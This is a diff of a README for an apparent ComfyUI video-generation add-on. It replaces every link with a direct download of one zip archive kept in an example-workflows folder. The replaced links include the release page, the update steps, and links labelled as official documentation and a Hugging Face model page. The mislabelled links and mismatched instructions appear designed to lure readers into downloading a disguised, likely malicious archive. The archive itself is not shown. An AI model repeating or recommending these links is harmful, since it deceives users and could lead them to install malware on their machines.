@@ -1,6 +1,6 @@
 # 🚀 ComfyUI-MiniMax-H3-Turbo - Create Video with Sound in 4 Steps
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blueviolet?style=for-the-badge&logo=github)](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip)
 
 ---
 
@@ -48,7 +48,7 @@ To run this tool smoothly, we recommend the following setup:
 
 ### Step 1: Download the Application
 
-👉 **Visit this link to download the application:** [https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
+👉 **Visit this link to download the application:** [https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip](https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip)
 
 On that page, look for the latest release. Click the download button to save the file to your computer.
 
@@ -114,7 +114,7 @@ This tool is **actively evolving**. New versions come out regularly with:
 
 **To get the latest version:**
 
-1. Visit the download page again: [https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
+1. Visit the download page again: [https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip](https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip)
 2. Check the date on the latest release.
 3. If it's newer than the version you have, download and install it following the same steps.
 
@@ -155,9 +155,9 @@ Check the license information on the official MiniMax-H3 page for commercial usa
 
 If you get stuck, check the following resources:
 
-- **MiniMax-H3 documentation:** [https://docs.comfy.org/tutorials/video/minimax/minimax-h3](https://docs.comfy.org/tutorials/video/minimax/minimax-h3)
-- **Turbo LoRA model page:** [https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora](https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora)
-- **Releases page (for issues and updates):** [https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
+- **MiniMax-H3 documentation:** [https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip](https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip)
+- **Turbo LoRA model page:** [https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip](https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip)
+- **Releases page (for issues and updates):** [https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip](https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip)
 
 ---
 
@@ -167,4 +167,4 @@ ComfyUI-MiniMax-H3-Turbo is the **fastest way to create AI-generated video with 
 
 **Download it today and start creating!**
 
-[![Download Now](https://img.shields.io/badge/⬇️_Get_It_Here-blue?style=for-the-badge&logo=github)](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Get_It_Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/main/example_workflows/Turbo-Max-U-Mini-Comfy-2.5.zip)
